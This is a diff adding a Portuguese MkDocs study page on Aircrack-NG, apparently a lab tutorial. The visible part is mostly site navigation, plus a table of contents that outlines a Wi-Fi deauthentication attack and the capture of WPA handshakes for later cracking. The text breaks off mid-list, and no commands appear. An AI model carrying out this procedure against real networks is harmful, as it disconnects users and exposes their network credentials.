@@ -1,0 +1,2195 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Modulo_103.2-aula01/">
+      
+      
+        <link rel="next" href="../OpenSUSE/">
+      
+      
+      <link rel="icon" href="../imagens/tux.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.4">
+    
+    
+      
+        <title>Aircrack-NG - 🐧 Comunidade Officinas</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#ataque-de-deauth-ou-dissociacao-de-redes-wi-fi" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="🐧 Comunidade Officinas" class="md-header__button md-logo" aria-label="🐧 Comunidade Officinas" data-md-component="logo">
+      
+  <img src="../imagens/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            🐧 Comunidade Officinas
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Aircrack-NG
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Mudar para o modo escuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Mudar para o modo escuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Mudar para o modo claro"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Mudar para o modo claro" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+    
+  
+  Início
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../Visao_Geral/" class="md-tabs__link">
+        
+  
+    
+  
+  Visão Geral
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../DHCP_Server/" class="md-tabs__link">
+          
+  
+  Servidores
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../Universo_NIX/" class="md-tabs__link">
+          
+  
+  Tópicos de Estudo
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../Modulo_103.1-aula00/" class="md-tabs__link">
+          
+  
+  Módulos LPI
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+  Ataques e Segurança
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../OpenSUSE/" class="md-tabs__link">
+          
+  
+  Sistemas Operacionais
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="🐧 Comunidade Officinas" class="md-nav__button md-logo" aria-label="🐧 Comunidade Officinas" data-md-component="logo">
+      
+  <img src="../imagens/logo.png" alt="logo">
+
+    </a>
+    🐧 Comunidade Officinas
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Início
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Visao_Geral/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Visão Geral
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Servidores
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Servidores
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DHCP_Server/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DHCP Server
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DNS_Server/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS Server
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Firewall_Server/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Firewall Server
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Mkdocs_Server/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MkDocs Server
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NFS_Server/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NFS Server
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    File Servers
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            File Servers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Fileserver_Debian/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Fileserver Debian
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Fileserver_Rocky/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Fileserver Rocky
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Fileserver_RockyLinux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Fileserver Rocky (Alternativo)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Fileserver_sem_RSAT/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Fileserver sem RSAT
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Controladores de Domínio
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_7">
+            <span class="md-nav__icon md-icon"></span>
+            Controladores de Domínio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DC1_Rocky/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DC-1 (Rocky)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DC2_Rocky/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DC-2 (Rocky)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DC1_pacotes_binarios/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DC-1 Pacotes Binários
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DC1_pacotes_compilados/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DC-1 Pacotes Compilados
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tópicos de Estudo
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Tópicos de Estudo
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Universo_NIX/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Universo NIX
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../FHS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    FHS (Filesystem Hierarchy Standard)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Systemd/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Systemd
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Raid/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    RAID
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Permissoes_Linux-01/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Permissões Linux 01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Permissoes_Linux-02/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Permissões Linux 02
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Usuarios_e_Grupos-1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Usuários e Grupos 01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Usuarios_e_Grupos-2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Usuários e Grupos 02
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Módulos LPI
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Módulos LPI
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Módulo 103.1 - Linha de Comando
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            Módulo 103.1 - Linha de Comando
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Modulo_103.1-aula00/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Aula 00
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Modulo_103.1-aula01/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Aula 01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Modulo_103.1-aula02/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Aula 02
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Modulo_103.1-aula03/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Aula 03
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Modulo_103.1-aula04/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Aula 04
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Modulo_103.1-aula05/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Aula 05
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Módulo 103.2 - Processamento de Texto
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            Módulo 103.2 - Processamento de Texto
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Modulo_103.2-aula01/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Aula 01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Ataques e Segurança
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Ataques e Segurança
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Aircrack-NG
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Aircrack-NG
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#instala-a-ferramenta-de-monitoramento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Instala a ferramenta de monitoramento:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#valida-o-nome-da-sua-placa-de-rede-wi-fi" class="md-nav__link">
+    <span class="md-ellipsis">
+      Valida o nome da sua placa de rede wi-fi:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#valida-possiveis-conflitos-de-hardware-antes-de-iniciar-os-processos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Valida possíveis conflitos de hardware antes de iniciar os processos:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#coloca-a-placa-de-rede-wi-fi-em-modo-monitoramento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Coloca a placa de rede wi-fi em modo monitoramento:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#valida-o-novo-nome-da-sua-placa-de-captura-de-redes-wi-fi" class="md-nav__link">
+    <span class="md-ellipsis">
+      Valida o novo nome da sua placa de captura de redes wi-fi:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#inicia-o-scan-de-todas-as-redes-proximas-aparecerao-diversas-redes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Inicia o scan de todas as redes próximas (aparecerão diversas redes):
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#encerra-o-scan-das-redes-apos-escolher-o-alvo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Encerra o scan das redes após escolher o alvo:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#anote-o-essid-nome-da-rede-alvo-bem-como-o-bssid-mac-e-tbem-o-canal-ch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anote o ESSID (Nome) da rede alvo, bem como o BSSID (MAC) e tbém o CANAL (CH):
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#podemos-validar-apenas-a-rede-alvo-se-preferir" class="md-nav__link">
+    <span class="md-ellipsis">
+      Podemos validar apenas a rede alvo, se preferir:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#posso-me-conectar-a-rede-wi-fi-alvo-se-for-um-laboratorio-usando-um-celular" class="md-nav__link">
+    <span class="md-ellipsis">
+      Posso me conectar á rede wi-fi alvo, se for um laboratório, usando um celular.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vai-constar-o-novo-cliente-com-dados-do-aparelho-definidos-em-station" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vai constar o novo cliente, com dados do aparelho, definidos em STATION.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#subo-o-comando-de-captura-de-pacotes-da-rede-alvo-e-salvo-o-arquivo-de-captura" class="md-nav__link">
+    <span class="md-ellipsis">
+      Subo o comando de captura de pacotes da rede alvo e salvo o arquivo de captura:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#inicia-o-ataque-ao-roteador-alvo-todos-os-clientes-caem-durante-o-ataque" class="md-nav__link">
+    <span class="md-ellipsis">
+      Inicia o ataque ao roteador alvo (todos os clientes caem durante o ataque):
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ao-tentar-re-conexao-os-clientes-entregam-o-handshake-de-4-vias-no-terminal-01" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ao tentar re-conexão, os clientes entregam o handshake de 4 vias no TERMINAL 01:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#podemos-encerrar-a-captura-no-terminal-01" class="md-nav__link">
+    <span class="md-ellipsis">
+      Podemos encerrar a captura no TERMINAL 01
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#podemos-encerrar-o-ataque-no-terminal-02" class="md-nav__link">
+    <span class="md-ellipsis">
+      Podemos encerrar o ataque no TERMINAL 02
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ate-esse-ponto-apenas-teriamos-um-ataque-de-negacao-de-servico-ddos-mas-nos-salvamos-um-arquivo-com-informacoes-capturadoscap-e-vamos-usa-lo" class="md-nav__link">
+    <span class="md-ellipsis">
